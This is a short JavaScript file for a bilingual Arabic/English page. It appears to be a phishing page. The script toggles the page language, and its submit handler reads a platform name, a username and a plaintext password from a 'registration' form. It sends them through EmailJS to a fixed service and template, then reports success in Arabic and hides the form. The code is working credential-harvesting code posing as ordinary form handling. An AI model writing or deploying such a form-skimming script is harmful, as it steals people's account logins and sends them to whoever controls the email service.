// Initialize EmailJS
document.addEventListener("DOMContentLoaded", () => {
    emailjs.init("1xqwBMfecM1SSulsh"); // Public Key
});

// Language toggling function
function toggleLanguage(lang) {
    const elements = document.querySelectorAll("[data-ar], [data-en]");
    elements.forEach(el => {
        el.textContent = lang === 'ar' ? el.getAttribute('data-ar') : el.getAttribute('data-en');
    });
    document.documentElement.lang = lang;
}

// Handle form submission
document.getElementById("registration-form").addEventListener("submit", (event) => {
    event.preventDefault();

    const platformName = document.getElementById('platform-name').textContent.trim();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        platform: platformName,
        username: username,
        password: password
    };

    emailjs.send('service_ir3vg5y', 'template_jw2qkzr', templateParams)
        .then(() => {
            alert('تم إرسال البيانات بنجاح!');
            document.getElementById('registration-form').reset();
            document.getElementById('form-container').style.display = 'none';
        })
        .catch(error => {
            console.error('خطأ أثناء إرسال البيانات:', error);
            alert('عذرًا، حدث خطأ أثناء إرسال البيانات.');
        });
});
